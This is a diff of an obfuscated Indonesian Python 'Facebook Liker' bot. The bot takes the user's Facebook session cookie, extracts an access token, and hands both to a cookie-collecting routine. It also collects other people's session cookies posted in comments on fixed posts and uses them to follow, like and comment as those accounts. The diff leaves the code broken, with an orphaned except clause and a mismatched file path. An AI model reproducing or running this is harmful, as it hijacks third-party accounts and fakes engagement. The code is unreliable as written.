@@ -54,7 +54,7 @@ class baner:
     def __main__(self):Console(width=55,style='bold white').print(panel('''[bold green]____  ____       [bold red] __    ____  _  _  ____  ____\n[bold green]( ___)(  _ \ [bold white] ___ [bold red](  )  (_  _)( )/ )( ___)(  _ \ \n[bold green] )__)  ) _ < [bold white](___)[bold red] )(__  _)(_  )  (  )__)  )   /\n[bold green](__)  (____/      [bold red](____)(____)(_)\_)(____)(_)\_)\n''',width=55,title='[bold yellow]>[bold green]>[bold cyan]> [bold white]FACEBOOK LIKER [bold cyan]<[bold green]<[bold yellow]<'),justify='center')
 class login_cookie:
     def __init__(self):self.r______ = requests.Session()
-    def login(self):baner();Console(width=55).print(panel('Masukan Cookie Akun Facebook',width=55,style='bold white',subtitle='┌',subtitle_align='left'),justify='center');self.cookie = input('   └─> ');self.language(self.cookie);head = {'cookie': self.cookie,'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]','host': 'business.facebook.com'};response = self.r______.get('https://business.facebook.com/business_locations',headers=head).text;tokenku = re.search('(EAAG\w+)', str(response)).group(1);TambahkanCookie(self.cookie,tokenku).Tambahkan();name, id = myname(self.cookie, tokenku);open('Data/Cookie.txt','w').write(self.cookie);open('Data/Token.txt','w').write(tokenku);sleep(2);clear();menu();Console(width=55).print(panel(f'[bold green]{name}',width=55,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Anda Login Ke Facebook Sebagai [bold cyan]<[bold green]<[bold yellow]<'),justify='center')
+    def login(self):baner();Console(width=55).print(panel('Masukan Cookie Akun Facebook',width=55,style='bold white',subtitle='┌',subtitle_align='left'),justify='center');self.cookie = input('   └─> ');self.language(self.cookie);head = {'cookie': self.cookie,'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]','host': 'business.facebook.com'};response = self.r______.get('https://business.facebook.com/business_locations',headers=head).text;tokenku = re.search('(EAAG\w+)', str(response)).group(1);TambahkanCookie(self.cookie,tokenku).Tambahkan();name, id = myname(self.cookie, tokenku);open('Cookie.txt','w').write(self.cookie);open('Token.txt','w').write(tokenku);sleep(2);clear();menu();Console(width=55).print(panel(f'[bold green]{name}',width=55,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Anda Login Ke Facebook Sebagai [bold cyan]<[bold green]<[bold yellow]<'),justify='center')
     def language(self,cookiee):
         user = '61555374118293'
         try:
@@ -98,7 +98,7 @@ def myname(cookie,token):
 class menu:
     def __init__(self):baner();self.__main__()
     def __main__(self):
-        try:cookie,tokenku = open('Data/Cookie.txt', 'r', encoding='utf-8').read(),open('Data/Token.txt', 'r', encoding='utf-8').read();name, id = myname(cookie, tokenku);Console(width=55,style='bold white').print(panel(f'''Name : {name}   ID : {id}''',width=60,title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Welcome [bold cyan]<[bold green]<[bold yellow]<'),justify='center')
+        try:cookie,tokenku = open('Cookie.txt', 'r', encoding='utf-8').read(),open('Token.txt', 'r', encoding='utf-8').read();name, id = myname(cookie, tokenku);Console(width=55,style='bold white').print(panel(f'''Name : {name}   ID : {id}''',width=60,title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Welcome [bold cyan]<[bold green]<[bold yellow]<'),justify='center')
         except Exception as e:Console(width=55,style='bold white').print(panel(f'[bold red]Cookie Expired Silahkan Masukan Cookie Baru !',width=60,title=f'[bold red]>[bold yellow]>[bold green]>[bold red]Expired[bold green]<[bold yellow]<[bold red]<'),justify='center');sleep(3);login_cookie().login()
         Console(width=55,style='bold white').print(panel('''[bold green][[bold white]01[bold green]].[bold white]Bot Auto Follow        [bold green][[bold white]05[bold green]].[bold white]Find ID Akun\n[bold green][[bold white]02[bold green]].[bold white]Bot Auto Like          [bold green][[bold white]06[bold green]].[bold white]Find ID Postingan\n[bold green][[bold white]03[bold green]].[bold white]Bot Auto Komen         [bold green][[bold white]07[bold green]].[bold white]Find ID Grup\n[bold green][[bold white]04[bold green]].[bold white]Bot Auto Share         [bold green][[bold white]08[bold green]].[bold red]Logout''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]MENU [bold cyan]<[bold green]<[bold yellow]<'));________________________________________ = input('   └─> ').lower()
         if   ________________________________________ in ('1', '01'):_________________________________________() #---> Bot Follow
@@ -109,14 +109,14 @@ class menu:
         elif ________________________________________ in ('6', '06'):_____________________________________________().________________________________________() #---> Find ID Postingan
         elif ________________________________________ in ('7', '07'):_____________________________________________().____________________________________________() #---> Find ID Grup
         elif ________________________________________ in ('8', '08'):
-            try:os.remove('Data/Token.txt');os.remove('Data/Cookie.txt');sleep(2);login_cookie().login()
+            try:os.remove('Data/Token.txt');os.remove('Cookie.txt');sleep(2);login_cookie().login()
             except:login_cookie().login()
         else:print('   └─> [bold red]Pilih Yang Benar');sleep(2);menu()
 class _________________________________________:
     def __init__(self):
         if __Author__ != 'Ronii XF':exit('Stop Recode Bang...!!!')
         else:
-            Console(width=55,style='bold white').print(panel('''Masukan ID Akun Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan ID [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.user_id = input('   └─> ');self.r______ = requests.Session();cookie  = open('Data/Cookie.txt', 'r').read();tokenku = open('Data/Token.txt', 'r').read()
+            Console(width=55,style='bold white').print(panel('''Masukan ID Akun Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan ID [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.user_id = input('   └─> ');self.r______ = requests.Session();cookie  = open('Cookie.txt', 'r').read();tokenku = open('Data/Token.txt', 'r').read()
             self.post_id = ['2860305164110035','2914634988667732','549345863862686'] #---> Tambah ID Postingan Disini
             self.cookies = [];self.user_name = self.get_user_name(self.user_id)
             for id_post in self.post_id:self.ScrapComent(id_post)
@@ -149,7 +149,7 @@ class _________________________________________:
                 if 'datr' in str(text):
                     if text in self.cookies:pass
                     else:
-                        lihat = open('Expired/Cookie-Follow.txt','r').read().splitlines()
+                        lihat = open('Cookie-Follow.txt','r').read().splitlines()
                         if text in str(lihat):pass
                         else:self.cookies.append(text)
                 else:pass
@@ -163,7 +163,7 @@ class _________________________________________:
                         id_cookie = re.search('c_user=(.*?);',str(cookie))[1]
                         name = self.get_user_name(id_cookie);Console(width=55,style='bold white').print(panel(f'''[bold green]{name} Follow {self.user_name}''',width=55,title='[bold yellow]>[bold white]>[bold cyan]> [bold green]( SUCCESS ) [bold cyan]<[bold white]<[bold yellow]<'),justify='center');break
                     elif '/a/subscriptions/remove?' in foll.get('href'):break
-                    elif 'login' in foll.get('href'):Console().print(f'\r[bold white]   └─> Gagal Follow {self.user_id}              ',end='\r');open('Expired/Cookie-Follow.txt','a').write(f'{cookie}\n');sleep(1);self.jeda(timer)
+                    elif 'login' in foll.get('href'):Console().print(f'\r[bold white]   └─> Gagal Follow {self.user_id}              ',end='\r');open('Cookie-Follow.txt','a').write(f'{cookie}\n');sleep(1);self.jeda(timer)
     def jeda(self,t):
         for x in range(t+1):
             Console().print(f'\r[bold white]   └─> Tunggu [bold green]{str(t)} [bold white]Detik               ',end='\r')
@@ -182,7 +182,7 @@ class _________________________________________:
     def selesai(self):Console(width=55).print(panel(f'''Silahkan Kembali Besok Untuk Update Cookie Terbaru''',width=55,title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Selesai [bold cyan]<[bold green]<[bold yellow]<',style='bold white'),justify='center');exit()
 class __________________________________________:
     def __init__(self):
-        Console(width=55,style='bold white').print(panel('''Masukan ID Postingan Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan ID [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.user_post_id = input('   └─> ');self.r______ = requests.Session();cookie  = open('Data/Cookie.txt', 'r').read();tokenku = open('Data/Token.txt', 'r').read()
+        Console(width=55,style='bold white').print(panel('''Masukan ID Postingan Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan ID [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.user_post_id = input('   └─> ');self.r______ = requests.Session();cookie  = open('Cookie.txt', 'r').read();tokenku = open('Data/Token.txt', 'r').read()
         self.post_id = ['2860305164110035','2914634988667732','549345863862686'] #---> Tambah ID Postingan Disini
         self.cookies = []        
         for id_post in self.post_id:self.ScrapComent(id_post)
@@ -220,7 +220,7 @@ class __________________________________________:
                     if 'datr' in str(text):
                         if text in self.cookies:pass
                         else:
-                            lihat = open('Expired/Cookie-Like.txt','r').read().splitlines()
+                            lihat = open('Cookie-Like.txt','r').read().splitlines()
                             if text in str(lihat):pass
                             else:self.cookies.append(text)
                     else:pass
@@ -234,7 +234,7 @@ class __________________________________________:
                         id_cookie = re.search('c_user=(.*?);',str(cookie))[1]
                         name = self.get_user_name(id_cookie);Console(width=55,style='bold white').print(panel(f'''[bold green]{name} Like {self.user_post_id}''',width=55,title='[bold yellow]>[bold white]>[bold cyan]> [bold green]( SUCCESS ) [bold cyan]<[bold white]<[bold yellow]<'),justify='center');break
                     elif 'logout.php?' in foll.get('href'):break
-                    elif 'login' in foll.get('href'):Console().print(f'\r[bold white]   └─> Gagal Like {self.user_post_id}              ',end='\r');open('Expired/Cookie-Like.txt','a').write(f'{cookie}\n');sleep(1);self.jeda(timer)
+                    elif 'login' in foll.get('href'):Console().print(f'\r[bold white]   └─> Gagal Like {self.user_post_id}              ',end='\r');open('Cookie-Like.txt','a').write(f'{cookie}\n');sleep(1);self.jeda(timer)
     def jeda(self,t):
         for x in range(t+1):
             Console().print(f'\r[bold white]   └─> Tunggu [bold green]{str(t)} [bold white]Detik               ',end='\r')
@@ -253,7 +253,7 @@ class __________________________________________:
     def selesai(self):Console(width=55).print(panel(f'''Silahkan Kembali Besok Untuk Update Cookie Terbaru''',width=55,title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Selesai [bold cyan]<[bold green]<[bold yellow]<',style='bold white'),justify='center');exit()
 class ___________________________________________:
     def __init__(self):
-        Console(width=55,style='bold white').print(panel('''Masukan ID Postingan Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan ID [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.user_post_id = input('   └─> ');self.r______ = requests.Session();cookie  = open('Data/Cookie.txt', 'r').read();tokenku = open('Data/Token.txt', 'r').read()
+        Console(width=55,style='bold white').print(panel('''Masukan ID Postingan Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan ID [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.user_post_id = input('   └─> ');self.r______ = requests.Session();cookie  = open('Cookie.txt', 'r').read();tokenku = open('Data/Token.txt', 'r').read()
         self.post_id = ['2860305164110035','2914634988667732','549345863862686'] #---> Tambah ID Postingan Disini
         self.cookies = [cookie]        
         for id_post in self.post_id:self.ScrapComent(id_post)
@@ -290,7 +290,7 @@ class ___________________________________________:
                     if 'datr' in str(text):
                         if text in self.cookies:pass
                         else:
-                            lihat = open('Expired/Cookie-Comment.txt','r').read().splitlines()
+                            lihat = open('Cookie-Comment.txt','r').read().splitlines()
                             if text in str(lihat):pass
                             else:self.cookies.append(text)
                     else:pass
@@ -309,11 +309,11 @@ class ___________________________________________:
                         'comment_text'  : coment_text,}
                     pos = bs(r.post('https://free.facebook.com'+raq['action'],data=dat,cookies={'cookie':cookie}).content,'html.parser')
                     cek = pos.find('title').text
-                    if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' :Console().print(f'\r[bold white]   └─> Gagal Komen {self.user_post_id}              ',end='\r');open('Expired/Cookie-Like.txt','a').write(f'{cookie}\n');sleep(1);self.jeda(timer)
+                    if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' :Console().print(f'\r[bold white]   └─> Gagal Komen {self.user_post_id}              ',end='\r');open('Cookie-Like.txt','a').write(f'{cookie}\n');sleep(1);self.jeda(timer)
                     else:
                         id_cookie = re.search('c_user=(.*?);',str(cookie))[1]
                         name = self.get_user_name(id_cookie);Console(width=55,style='bold white').print(panel(f'''[bold green]{name} Komen {self.user_post_id}''',width=55,title='[bold yellow]>[bold white]>[bold cyan]> [bold green]( SUCCESS ) [bold cyan]<[bold white]<[bold yellow]<'),justify='center');break
-                except Exception as e:Console().print(f'\r[bold white]   └─> Gagal Komen/{e} {self.user_post_id}              ',end='\r');open('Expired/Cookie-Comment.txt','a').write(f'{cookie}\n');sleep(1);self.jeda(timer)
+                except Exception as e:Console().print(f'\r[bold white]   └─> Gagal Komen/{e} {self.user_post_id}              ',end='\r');open('Cookie-Comment.txt','a').write(f'{cookie}\n');sleep(1);self.jeda(timer)
     def jeda(self,t):
         for x in range(t+1):
             Console().print(f'\r[bold white]   └─> Tunggu [bold green]{str(t)} [bold white]Detik               ',end='\r')
@@ -332,7 +332,7 @@ class ___________________________________________:
     def selesai(self):Console(width=55).print(panel(f'''Silahkan Kembali Besok Untuk Update Cookie Terbaru''',width=55,title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Selesai [bold cyan]<[bold green]<[bold yellow]<',style='bold white'),justify='center');exit()
 class ____________________________________________:
     def __init__(self):
-        Console(width=55,style='bold white').print(panel('''Masukan Link Postingan Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan Link [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.link_post = input('   └─> ');Console(width=55,style='bold white').print(panel('''Masukan Jumlah Share Postingan''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan Jumlah [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.count = input('   └─> ');Console(width=55,style='bold white').print(panel('''Masukan Delay Share Postingan''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan Delay [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.delay = input('   └─> ');self.r______ = requests.Session();self.cookie  = open('Data/Cookie.txt', 'r').read();self.tokenku = open('Data/Token.txt', 'r').read()
+        Console(width=55,style='bold white').print(panel('''Masukan Link Postingan Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan Link [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.link_post = input('   └─> ');Console(width=55,style='bold white').print(panel('''Masukan Jumlah Share Postingan''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan Jumlah [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.count = input('   └─> ');Console(width=55,style='bold white').print(panel('''Masukan Delay Share Postingan''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan Delay [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.delay = input('   └─> ');self.r______ = requests.Session();self.cookie  = open('Cookie.txt', 'r').read();self.tokenku = open('Data/Token.txt', 'r').read()
         self.ScrapComment()
         self.Selesai()
     def ScrapComment(self):
@@ -385,12 +385,7 @@ class _____________________________________________:
 
 if ________ in (_________):
     os.system('git pull')
-    try:os.mkdir('Data')
     except:pass
-    try:os.mkdir('Find-ID')
+    try:cookie,tokenku = open('Cookie.txt', 'r', encoding='utf-8').read(),open('Token.txt', 'r', encoding='utf-8').read();TambahkanCookie(cookie,tokenku).Bot()
     except:pass
-    try:os.mkdir('Expired')
-    except:pass
-    try:cookie,tokenku = open('Data/Cookie.txt', 'r', encoding='utf-8').read(),open('Data/Token.txt', 'r', encoding='utf-8').read();TambahkanCookie(cookie,tokenku).Bot()
-    except:pass
-    open('Expired/Cookie-Follow.txt','a');open('Expired/Cookie-Like.txt','a');open('Expired/Cookie-Comment.txt','a');clear();Terminal_Size();print(exit('Tinggal Make Apa Susahnya Njir....') if __Author__ != 'Ronii XF' else menu())
+    open('Cookie-Follow.txt','a');open('Cookie-Like.txt','a');open('Cookie-Comment.txt','a');clear();Terminal_Size();print(exit('Tinggal Make Apa Susahnya Njir....') if __Author__ != 'Ronii XF' else menu())
